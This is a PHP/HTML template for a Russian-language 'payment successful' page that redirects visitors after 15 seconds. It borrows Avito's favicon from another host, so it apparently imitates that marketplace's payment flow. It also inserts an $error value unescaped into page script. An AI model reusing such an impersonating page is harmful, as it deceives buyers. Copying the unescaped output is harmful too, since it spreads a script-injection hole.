<?php 
	if(empty($_REQUEST['order_id'])) {
		header("Location: https://".$_SERVER["SERVER_NAME"]."/");
	} else {
		header("Refresh: 15; url=https://".$_SERVER["SERVER_NAME"]."/");
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/common.css">
		<link rel="shortcut icon" type="image/png" href="https://www.avito.st/favicon.ico">

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.js"></script>
		<script type="text/javascript" src="js/common.js"></script>
		<script type="text/javascript">
			var heading_button = "<i class='fas fa-chevron-right'></i> <?php echo $heading_button; ?>";
		</script>

		<meta charset="utf-8">
		<meta http-equiv="pragma" content="no-cache">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

		<title><?php echo $title; ?></title>
	</head>

	<body>
		
<br>
		<div class="block-method">
			<div class="row" style="margin-top: -20px;">
				<div class="list-method">
					<div class="row">
						

<img src="https://www.shopolog.ru/s/img/services/f4/ff/800x400_f4ff3c3ec5d2c65affe10fbe216d45a8___png____4_8c7f7f84.png" height="150" width="250" style="margin-left:25%">
							
					
					</div>
					
				</div>
				<div class="divider" style="margin-top: 20px;"></div>
			</div>
		</div>

        <div class="block-form" id="cl">
    					<h3 for="input-cap" style="text-align: center;">Оплата прошла успешно!<div class="col-xs-16"><br>
					</div></h3>

		</div>

	</body>

	<?php 
		if (isset($error) && $error !== "") {
			echo '
			<script type="text/javascript">
				$(".label-error").text("' . $error . '");
				$(".block-error").show();
			</script>
			';
		}
	?>
</html>